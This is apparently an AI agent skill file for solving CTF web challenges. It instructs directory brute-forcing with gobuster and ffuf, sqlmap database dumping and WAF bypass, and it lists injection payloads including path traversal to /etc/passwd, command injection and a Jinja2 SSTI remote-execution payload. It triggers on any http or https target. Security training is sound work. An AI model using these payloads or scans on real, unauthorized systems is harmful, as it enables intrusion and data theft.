---
name: web
description: >-
  Solve CTF web security challenges: SQL injection, XSS, authentication
  bypass, SSTI, path traversal, and source code audit. Use when given a
  URL, web app source code, or HTTP traffic. Triggers: .php .html .js
  files, "SQL injection", "XSS", "SSTI", "LFI", "RFI", "cookie",
  "JWT", "robots.txt", "directory enumeration", http:// or https://
  targets. Tools: sqlmap, gobuster, ffuf, nikto, burpsuite.
  NOT for network packet analysis (use forensics).
---

# CTF Web

Analyze and solve web security challenges.

## When to Use

Use this command for challenges involving:

- Web applications
- SQL injection
- XSS vulnerabilities
- Authentication bypass
- API exploitation
- Source code analysis

## Bundled Scripts

- [check-tools.sh](scripts/check-tools.sh) — Verify required web tools are installed

## Instructions

1. First check tool availability: `bash scripts/check-tools.sh`

2. Run the web analysis:

   ```bash
   ctf run web $ARGUMENTS
   ```

2. For directory/file enumeration:

   ```bash
   # Directory brute-force
   gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

   # With extensions
   gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt

   # Fast fuzzing
   ffuf -u http://target.com/FUZZ -w wordlist.txt
   ```

3. For SQL injection:

   ```bash
   # Test URL for SQLi
   sqlmap -u "http://target.com/page?id=1" --dbs

   # Enumerate databases
   sqlmap -u "http://target.com/page?id=1" --dbs

   # Dump table
   sqlmap -u "http://target.com/page?id=1" -D database -T table --dump
   ```

4. Manual testing checklist:
   - Check robots.txt, sitemap.xml
   - Look for .git, .svn, backup files
   - Test input fields for injection
   - Examine cookies and headers
   - View page source

## Common Vulnerabilities

| Vulnerability | Test Payload |
|--------------|--------------|
| SQL Injection | `' OR '1'='1` |
| XSS | `<script>alert(1)</script>` |
| Path Traversal | `../../../etc/passwd` |
| SSTI | `{{7*7}}` or `${7*7}` |
| Command Injection | `; id` or `\| id` |

## Things to Check

1. **Authentication:**
   - Default credentials
   - JWT token manipulation
   - Cookie tampering

2. **Files:**
   - Source code disclosure
   - Backup files (.bak, ~, .old)
   - Config files exposed

3. **Input:**
   - All parameters in URL
   - POST data fields
   - Headers and cookies

## Common Issues

**`sqlmap` not found**
- **Cause:** sqlmap not installed
- **Solution:** Install with `apt install sqlmap` (Debian/Ubuntu) or `pip install sqlmap` or `brew install sqlmap` (macOS)

**`gobuster` or `ffuf` not found**
- **Cause:** Go-based tools not installed
- **Solution:** Install gobuster: `apt install gobuster` or `go install github.com/OJ/gobuster/v3@latest`. Install ffuf: `apt install ffuf` or `go install github.com/ffuf/ffuf/v2@latest`. Both need Go or prebuilt binaries

**sqlmap: "parameter does not appear to be injectable"**
- **Cause:** The parameter may not be vulnerable, WAF is blocking, or the injection point is elsewhere (cookies, headers, POST body)
- **Solution:** Try different injection points: `--cookie`, `--headers`, `--data` for POST. Increase risk/level: `--level=5 --risk=3`. Check for non-standard injection (JSON body, XML). Try manual injection first to confirm the vuln exists before automating

**gobuster/ffuf returns too many false positives (all 200 or all same size)**
- **Cause:** The server returns a custom 404 page with 200 status, or a WAF returns generic responses
- **Solution:** For ffuf: filter by response size `--fs <size>` or by word count `--fw <count>`. For gobuster: use `--exclude-length` to filter. Identify the default 404 response size first, then filter it out

**Connection refused or timeout**
- **Cause:** CTF challenge server is down, wrong port, or VPN not connected
- **Solution:** Verify the target URL and port. Check if you need to connect to a CTF VPN first. Use `curl -v` to debug connection issues. Some challenges run on non-standard ports — check the challenge description

**WAF blocks injection attempts**
- **Cause:** Web Application Firewall detects and blocks attack payloads
- **Solution:** Try WAF bypass techniques: case variation (`SeLeCt`), comment injection (`SEL/**/ECT`), URL encoding, or alternative syntax. For sqlmap, use tamper scripts: `--tamper=space2comment,between`. Test manually to understand what's blocked

**SSTI payload `{{7*7}}` returns 49 but can't get RCE**
- **Cause:** Template engine sandbox restrictions, or wrong payload for the engine type
- **Solution:** Identify the engine first: `{{7*'7'}}` returns `7777777` (Jinja2) vs `49` (Twig). For Jinja2 RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`. Check PayloadsAllTheThings for engine-specific payloads

**No wordlist available for directory enumeration**
- **Cause:** Wordlists like `rockyou.txt` or `common.txt` not present
- **Solution:** Install SecLists: `apt install seclists` or `git clone https://github.com/danielmiessler/SecLists`. Key wordlists: `/usr/share/seclists/Discovery/Web-Content/common.txt` for directories, `/usr/share/wordlists/rockyou.txt` for passwords

## Example Usage

```bash
/ctf-kit:web ./webapp-source/
/ctf-kit:web http://challenge.ctf.com
```
